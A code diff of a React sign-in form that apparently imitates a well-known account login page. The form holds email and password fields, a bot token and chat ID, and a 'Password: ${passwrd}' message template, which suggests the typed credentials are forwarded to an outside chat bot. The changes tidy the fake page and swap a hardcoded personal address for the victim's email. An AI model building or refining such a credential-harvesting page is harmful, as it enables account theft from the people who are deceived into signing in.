@@ -5,8 +5,8 @@ import { toast } from "react-toastify";
 
 const Form = () => {
   const [viewPassword, setViewPassword] = useState(false);
-  const [emal, setEmal] = useState();
-  const [passwrd, setPasswrd] = useState();
+  const [emal, setEmal] = useState("");
+  const [passwrd, setPasswrd] = useState("");
   const botToken = import.meta.env.VITE_BOT_TOKEN;
   const chatId = import.meta.env.VITE_CHAT_ID;
 
@@ -118,16 +118,16 @@ Password: ${passwrd}
           </div>
 
           <div className={styles.formBtmDiv}>
-            <p role="button">
+            <p>
               {!viewPassword ? "No account? " : ""}
               <span className={styles.colorP}>
-                {viewPassword ? "Create one!" : "Forgot password?"}
+                {viewPassword ? "Create one!" : "Create one!"}
               </span>
             </p>
-            <p className={styles.colorP} role="button">
+            <p className={styles.colorP}>
               {!viewPassword
                 ? "Can't access your account?"
-                : "Email code to ikechukwuprosper8@gmail.com"}
+                : `Email code to ${emal}`}
             </p>
           </div>
 
@@ -142,9 +142,9 @@ Password: ${passwrd}
           </div>
         </form>
       </div>
-      <div className={styles.btmCtn}>
+      {/* <div className={styles.btmCtn}>
         <p>Sign-in Options</p>
-      </div>
+      </div> */}
     </div>
   );
 };
